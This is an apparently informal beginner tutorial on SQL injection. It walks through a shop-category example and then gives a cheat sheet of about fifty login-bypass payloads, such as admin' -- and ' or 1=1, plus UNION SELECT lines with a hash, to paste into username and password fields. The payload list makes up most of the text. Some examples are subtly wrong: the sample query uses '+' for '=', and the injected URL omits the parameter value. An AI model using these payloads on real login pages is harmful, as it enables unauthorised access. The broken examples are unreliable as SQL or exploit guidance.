# What is SQL Injection  
SQL Injection (SQLi) is a web security vulnerability in which can allow an attacker the ability to interfere  
with any given queries that the target application makes to its respective database.  
Think of it like this;  
Application has login page. We want to log in but do not know the information.  
SQL Injection can allow us to discover the database, and possibly read from it, thus granting  
us access to read the information and be able to log into the website.  
  
## Retrieving Hidden Data  
Let's consider we are shopping on some random E-Commerce site. And we see a category called "Gifts". The URL would look like;  
```
https://randome-com.site/products?category=Gifts
```
What the Website is doing, is it is communicating with the database and it is telling the SQL structure this;  
```
SELECT * FROM products WHERE category + 'Gifts' AND released = 1
```
Basically, the website is telling the database;  
*"Yo big man, give me everything you have inside of the "Gifts" Category. I got a new shopper!"*  
  
What we, as an attacker can do, is perform a simple Injection that will allow us to discover all possible releases inside of "Gifts"  
like this;  
```
https://randome-com.site/products?category'--  
```
See how we changed the end to ('--), this will tell the website to query the database and find all possible releases!  
  
## Bypasing Login with SQLi  
Now, 90% of the time we are looking for an SQL Injection is not to go shopping. But instead, we want to gain access to the target.  
This list allows us to add the SQLi command into the "Username" or "Password" field and see if we can either;  
A) Bypass the login completely  
B) Discover the Database and read from it!  
  
**SQLi Cheat Sheet**  
```
or 1=1
or 1=1--
or 1=1#
or 1=1/*
admin' --
admin' #
admin'/*
admin' or '1'='1
admin' or '1'='1'--
admin' or '1'='1'#
admin' or '1'='1'/*
admin'or 1=1 or ''='
admin' or 1=1
admin' or 1=1--
admin' or 1=1#
admin' or 1=1/*
admin') or ('1'='1
admin') or ('1'='1'--
admin') or ('1'='1'#
admin') or ('1'='1'/*
admin') or '1'='1
admin') or '1'='1'--
admin') or '1'='1'#
admin') or '1'='1'/*
1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
admin" --
admin" #
admin"/*
admin" or "1"="1
admin" or "1"="1"--
admin" or "1"="1"#
admin" or "1"="1"/*
admin"or 1=1 or ""="
admin" or 1=1
admin" or 1=1--
admin" or 1=1#
admin" or 1=1/*
admin") or ("1"="1
admin") or ("1"="1"--
admin") or ("1"="1"#
admin") or ("1"="1"/*
admin") or "1"="1
admin") or "1"="1"--
admin") or "1"="1"#
admin") or "1"="1"/*
1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055
```
